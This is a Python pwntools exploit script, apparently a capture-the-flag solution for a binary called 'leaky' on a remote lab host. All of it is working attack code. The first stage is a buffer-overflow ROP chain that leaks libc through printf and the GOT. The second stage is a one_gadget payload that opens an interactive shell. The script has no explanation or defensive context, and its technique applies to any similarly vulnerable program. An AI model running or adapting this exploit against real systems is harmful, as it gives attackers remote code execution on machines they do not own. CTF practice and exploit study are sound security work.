#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./leaky')
    elf = ELF('./leaky')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('10.21.13.112', 10002)
    elf = ELF('./leaky')
    libc = ELF('./libc.so.6')

start = 0x00000000004006D0
printf_plt = elf.plt['printf']
read_got = elf.got['read']
fmt_addr = 0x00000000004009D1
pop_rdi_ret = 0x0000000000400923
pop_rsi_r15_ret = 0x0000000000400921

#gdb.attach(p)

#payload = cyclic(0x200)
payload = ('A' * 40 + 
    p64(pop_rdi_ret) + p64(fmt_addr) + 
    p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + 
    p64(printf_plt) + 
    p64(start)
)
p.recvuntil('what you got:')
p.send(payload)
p.recvuntil('secret number: ')
libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - libc.symbols['read']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_gadgets[0]

payload = 'A' * 40 + p64(one_gadget)
p.recvuntil('what you got:')
p.send(payload)
p.interactive()

